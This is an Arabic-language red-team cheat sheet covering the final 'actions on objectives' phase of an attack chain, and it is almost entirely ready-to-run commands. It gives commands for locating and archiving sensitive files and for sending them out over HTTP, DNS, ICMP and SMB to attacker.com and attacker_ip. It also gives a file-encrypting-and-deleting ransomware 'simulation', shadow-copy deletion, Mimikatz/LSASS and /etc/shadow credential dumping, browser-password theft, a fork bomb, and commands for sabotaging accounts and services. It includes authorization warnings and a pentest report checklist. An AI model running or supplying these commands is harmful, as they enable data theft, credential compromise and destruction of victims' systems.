<a id="-phase-7-actions-on-objectives"></a>
# 🎯 المرحلة 7: تنفيذ الأهداف (Actions on Objectives)

<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](07-Actions-Objectives.tr.md) • [🇬🇷 Ελληνικά](07-Actions-Objectives.el.md)

```
   █████╗  ██████╗████████╗██╗ ██████╗ ███╗   ██╗███████╗     ██████╗ ███╗   ██╗
  ██╔══██╗██╔════╝╚══██╔══╝██║██╔═══██╗████╗  ██║██╔════╝    ██╔═══██╗████╗  ██║
  ███████║██║        ██║   ██║██║   ██║██╔██╗ ██║███████╗    ██║   ██║██╔██╗ ██║
  ██╔══██║██║        ██║   ██║██║   ██║██║╚██╗██║╚════██║    ██║   ██║██║╚██╗██║
  ██║  ██║╚██████╗   ██║   ██║╚██████╔╝██║ ╚████║███████║    ╚██████╔╝██║ ╚████║
  ╚═╝  ╚═╝ ╚═════╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝     ╚═════╝ ╚═╝  ╚═══╝
         ██████╗ ██████╗      ██╗███████╗ ██████╗████████╗██╗██╗   ██╗███████╗███████╗
        ██╔═══██╗██╔══██╗     ██║██╔════╝██╔════╝╚══██╔══╝██║██║   ██║██╔════╝██╔════╝
        ██║   ██║██████╔╝     ██║█████╗  ██║        ██║   ██║██║   ██║█████╗  ███████╗
        ██║   ██║██╔══██╗██   ██║██╔══╝  ██║        ██║   ██║╚██╗ ██╔╝██╔══╝  ╚════██║
        ╚██████╔╝██████╔╝╚█████╔╝███████╗╚██████╗   ██║   ██║ ╚████╔╝ ███████╗███████║
         ╚═════╝ ╚═════╝  ╚════╝ ╚══════╝ ╚═════╝   ╚═╝   ╚═╝  ╚═══╝  ╚══════╝╚══════╝
```

**الهدف:** تحقيق الهدف النهائي: إخراج البيانات أو إتلافها أو إحداث أثر آخر.

---

<a id="-data-exfiltration"></a>
## 📤 إخراج البيانات (Data Exfiltration)

<a id="finding-sensitive-data"></a>
### العثور على البيانات الحساسة

<a id="windows"></a>
#### Windows
```cmd
# البحث عن الملفات الحساسة
dir /s /b *password* *credential* *secret* *.kdbx *.key
dir /s /b *.doc* *.xls* *.pdf *.txt *.config

# البحث عن ملفات عُدلت مؤخراً
forfiles /P C:\ /S /D +01/01/2024 /C "cmd /c echo @path"

# PowerShell — البحث بحسب المحتوى
Get-ChildItem -Recurse | Select-String -Pattern "password" -List | Select Path
Get-ChildItem -Path C:\ -Include *.txt,*.doc*,*.xls* -Recurse -ErrorAction SilentlyContinue
```

<a id="linux"></a>
#### Linux
```bash
# البحث عن الملفات الحساسة
find / -name "*password*" -o -name "*.key" -o -name "*.pem" 2>/dev/null
find / -name "*.conf" -o -name "*.config" 2>/dev/null | xargs grep -l "password"

# الملفات الحديثة
find / -mtime -7 -type f 2>/dev/null

# الملفات الكبيرة
find / -size +100M -type f 2>/dev/null
```

<a id="compress--stage-data"></a>
### ضغط البيانات وتجهيزها للنقل

<a id="windows-1"></a>
#### Windows
```powershell
# PowerShell — إنشاء ZIP
Compress-Archive -Path C:\Sensitive -DestinationPath C:\temp\data.zip

# 7-Zip
7z a -p"password" data.7z C:\Sensitive\*

# استخدام tar مع الضغط
tar -cvzf data.tar.gz C:\Sensitive\
```

<a id="linux-1"></a>
#### Linux
```bash
# إنشاء أرشيف مضغوط
tar -cvzf /tmp/data.tar.gz /home/user/sensitive/

# مع التشفير
tar -cvzf - /sensitive | openssl enc -aes-256-cbc -e > data.tar.gz.enc

# ملف ZIP بكلمة مرور
zip -r -e data.zip /sensitive/
```

<a id="exfiltration-methods"></a>
### طرق إخراج البيانات

<a id="httphttps"></a>
#### HTTP/HTTPS
```bash
# الرفع باستخدام curl
curl -X POST -F "file=@/tmp/data.zip" http://attacker.com/upload.php

# Base64 عبر GET للبيانات الصغيرة
base64 /tmp/data.zip | curl -d @- http://attacker.com/receive

# الرفع باستخدام PowerShell
$bytes = [IO.File]::ReadAllBytes("C:\temp\data.zip")
Invoke-WebRequest -Uri "http://attacker.com/upload" -Method POST -Body $bytes
```

<a id="dns-exfiltration"></a>
#### إخراج البيانات عبر DNS
```bash
# ترميز البيانات داخل استعلامات DNS
cat /tmp/data | xxd -p | while read line; do nslookup $line.attacker.com; done

# استخدام dnscat2
dnscat2 attacker.com

# DNSExfiltrator
python dnsexfiltrator.py -d attacker.com -f data.zip
```

<a id="icmp"></a>
#### ICMP
```bash
# إخراج البيانات عبر ping
xxd -p -c 4 data.zip | while read line; do ping -c 1 -p $line attacker.com; done

# استخدام icmpsh
python icmpsh_m.py ATTACKER_IP VICTIM_IP
```

<a id="smb"></a>
#### SMB
```bash
# النسخ إلى مشاركة المهاجم
copy C:\Sensitive\data.zip \\attacker_ip\share\

# التركيب والنسخ في Linux
smbclient //attacker_ip/share -U user -c "put data.zip"
```

<a id="cloud-services"></a>
#### الخدمات السحابية
```bash
# AWS S3
aws s3 cp data.zip s3://bucket-name/

# Azure Blob
az storage blob upload --file data.zip --container-name mycontainer --name data.zip

# Google Cloud
gsutil cp data.zip gs://bucket-name/
```

---

<a id="-destructive-actions-ransomware-simulation"></a>
## 💣 إجراءات تخريبية (محاكاة برمجيات الفدية)

> ⚠️ **تحذير:** لعمليات الفريق الأحمر المصرح بها فقط!

<a id="encryption-simulation"></a>
### محاكاة التشفير

> **تصحيح مهم:** رغم تسمية المثال «محاكاة»، فهو يحذف الملفات الأصلية باستخدام `Remove-Item` بعد إنشاء ملفات جديدة. لذلك هو إجراء يغيّر البيانات فعلياً، وليس عرضاً بلا آثار.

```powershell
# PowerShell — تشفير الملفات (محاكاة)
$key = [System.Text.Encoding]::UTF8.GetBytes("0123456789ABCDEF")
$files = Get-ChildItem -Path C:\TestData -Recurse -File
foreach ($file in $files) {
    $content = Get-Content $file.FullName -Raw
    $encrypted = [System.Security.Cryptography.ProtectedData]::Protect([System.Text.Encoding]::UTF8.GetBytes($content), $key, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    Set-Content "$($file.FullName).encrypted" $encrypted
    Remove-Item $file.FullName
}
```

<a id="volume-shadow-copy-deletion"></a>
### حذف نسخ الظل لوحدات التخزين

> **تصحيح:** أمر `vssadmin resize shadowstorage` في نهاية المثال يغيّر الحد المخصص لتخزين نسخ الظل؛ لا يعطّل الميزة بحد ذاته، خلافاً للتعليق المختصر في الأصل. وقد يؤثر تقليص المساحة في النسخ المتاحة.

```cmd
# حذف نسخ الظل (يمنع الاستعادة منها)
vssadmin delete shadows /all /quiet
wmic shadowcopy delete

# تعطيل نسخ الظل
vssadmin resize shadowstorage /for=C: /on=C: /maxsize=401MB
```

---

<a id="-credential-harvesting"></a>
## 🔐 جمع بيانات الاعتماد

<a id="windows-credentials"></a>
### بيانات اعتماد Windows
```powershell
# Mimikatz — جميع بيانات الاعتماد
mimikatz# sekurlsa::logonpasswords

# تفريغ قاعدة SAM
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
mimikatz# lsadump::sam /sam:SAM /system:SYSTEM

# تفريغ ذاكرة LSASS
procdump -ma lsass.exe lsass.dmp
mimikatz# sekurlsa::minidump lsass.dmp

# الاستخراج من التفريغ
pypykatz lsa minidump lsass.dmp
```

<a id="linux-credentials"></a>
### بيانات اعتماد Linux
```bash
# ملف shadow
cat /etc/shadow

# مفاتيح SSH
find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null

# ملفات سجل الأوامر
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.psql_history

# ملفات الإعداد
grep -r "password" /etc/ 2>/dev/null
grep -r "password" /home/ 2>/dev/null
```

<a id="browser-credentials"></a>
### بيانات اعتماد المتصفح
```bash
# بيانات اعتماد Chrome في Windows
# الموقع: %LOCALAPPDATA%\Google\Chrome\مستخدم Data\Default\Login Data

# بيانات اعتماد Firefox في Windows
# الموقع: %APPDATA%\Mozilla\Firefox\Profiles\*.default\logins.json

# LaZagne — جميع كلمات مرور المتصفح
python laZagne.py all
```

---

<a id="-system-impact"></a>
## 🖥️ التأثير في النظام

<a id="denial-of-service"></a>
### حجب الخدمة
```bash
# قنبلة تفرع العمليات في Linux — لا تنفّذها!
:(){ :|:& };:

# ملء القرص
dd if=/dev/zero of=/tmp/fill bs=1M count=100000

# استنزاف المعالج
yes > /dev/null &
```

<a id="account-manipulation"></a>
### التلاعب بالحسابات
```bash
# تغيير كلمات مرور جميع المستخدمين
net user administrator NewP@ssw0rd!

# قفل الحسابات
net user username /active:no

# حذف المستخدمين
net user username /delete
```

<a id="service-disruption"></a>
### تعطيل الخدمات
```cmd
# إيقاف الخدمات الحرجة
net stop "DNS Server"
net stop "Active Directory Domain Services"

# تعطيل الخدمات
sc config wuauserv start= disabled
```

---

<a id="-quick-reference"></a>
## 📊 مرجع سريع

<a id="exfiltration-methods-1"></a>
### طرق إخراج البيانات

| الطريقة | المزايا | العيوب |
|--------|------|------|
| HTTP/HTTPS | حركة مرور شائعة ومشفرة | قد تخضع للمراقبة |
| DNS | غالباً لا تخضع للمراقبة | بطيئة ومحدودة الحجم |
| ICMP | قد تتجاوز جدران الحماية | بطيئة جداً |
| SMB | سريعة ومدمجة في النظام | داخلية فقط |
| Cloud | خدمات مشروعة | تتطلب بيانات اعتماد |

<a id="data-location-priorities"></a>
### أولويات مواقع البيانات

| الموقع | القيمة |
|----------|-------|
| متحكم المجال (Domain Controller) | الأعلى — بيانات اعتماد AD |
| خوادم الملفات | عالية — المستندات |
| خوادم البريد الإلكتروني | عالية — المراسلات |
| خوادم قواعد البيانات | عالية — بيانات الأعمال |
| خوادم التطوير | متوسطة — الشيفرة المصدرية |
| محطات عمل المستخدمين | متوسطة — الملفات المحلية |

---

<a id="-pentest-report-checklist"></a>
## ✅ قائمة فحص تقرير اختبار الاختراق

```markdown
- [ ] توثيق جميع الأنظمة المخترقة
- [ ] سرد جميع بيانات الاعتماد المكتشفة
- [ ] رسم مسار الهجوم بدءاً من الوصول الأولي
- [ ] توثيق الثغرات المستغلة
- [ ] تسجيل مواقع البيانات الحساسة المكتشفة
- [ ] تقديم توصيات المعالجة
- [ ] إدراج خط زمني للأنشطة
- [ ] إرفاق لقطات شاشة تثبت الوصول
```

---

<a id="-related-cheatsheets"></a>
## 🔗 أدلة مرجعية ذات صلة

- [Mimikatz](../../Mimikatz/README.md)
- [أوامر Linux](../../Linux-Commands/README.md)
- [PowerShell](../../PowerShell/README.md)

---

**المرحلة السابقة:** [← 06 - تفادي الدفاعات](./06-Defense-Evasion.ar.md)

**العودة إلى النظرة العامة:** [🎯 نظرة عامة على سلسلة الهجوم](./README.ar.md)

---

<p align="center">
  <b>🎯 اكتملت المهمة!</b><br>
  <i>تذكّر: لا تنفّذ هذه الإجراءات إلا بتفويض مناسب!</i>
</p>
